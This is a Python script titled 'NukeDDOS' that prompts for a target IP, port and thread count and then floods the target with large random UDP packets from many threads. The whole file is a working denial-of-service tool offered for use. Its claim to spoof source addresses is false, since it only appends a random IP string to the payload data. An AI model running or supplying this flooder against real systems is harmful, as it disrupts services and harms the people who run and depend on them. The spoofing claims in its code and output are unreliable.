import os
import time
import socket
import random
import threading
import struct
from datetime import datetime

# Packet types for flexibility
PACKET_TYPES = {
    "UDP": socket.SOCK_DGRAM,
    "RAW": socket.SOCK_RAW,
    "ICMP": socket.SOCK_RAW,  # Requires root on most systems
    "TCP": socket.SOCK_STREAM  # For future use if needed
}

# Configuration interface
os.system("clear")
os.system("figlet -f slant NukeDDOS")
print("Author   : Laila19")
print("github   : https://github.com/lailacypher")
print()
ip = input("Target IP : ").strip()
port = int(input("Port      : ").strip())
threads = int(input("Threads   : ").strip())

# Packet type selection
print("\nSelect packet type:")
for i, packet_type in enumerate(PACKET_TYPES.keys(), 1):
    print(f"{i}. {packet_type}")
type_choice = int(input("Packet Type (1-4): ").strip())
packet_type = list(PACKET_TYPES.keys())[type_choice - 1]
sock_type = PACKET_TYPES[packet_type]
sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_type == "UDP" else 0)
data = random._urandom(2048)  # Increased packet size for more impact
sent = 0
lock = threading.Lock()

# Initial progress bar
os.system("clear")
os.system("figlet Attack Starting")
progress = ["[                    ] 0%", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
for step in progress:
    print(step)
    time.sleep(0.2)  # Faster startup

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def attack():
    global sent
    while True:
        try:
            fake_ip = random_ip()
            packet = data + bytes(fake_ip, 'utf-8')
            sock.sendto(packet, (ip, port))
            # Send fragmented packets for more impact
            for _ in range(5):
                sock.sendto(packet[:512], (ip, port))
                sock.sendto(packet[512:1024], (ip, port))
                sock.sendto(packet[1024:1536], (ip, port))
                sock.sendto(packet[1536:], (ip, port))
            with lock:
                sent += 5  # Count fragmented packets
                print(f"Packets {sent} sent successfully to {ip} through port {port} (spoofed from {fake_ip})")
        except Exception as e:
            print(f"Error sending packet: {e}")

# Starting threads
for _ in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
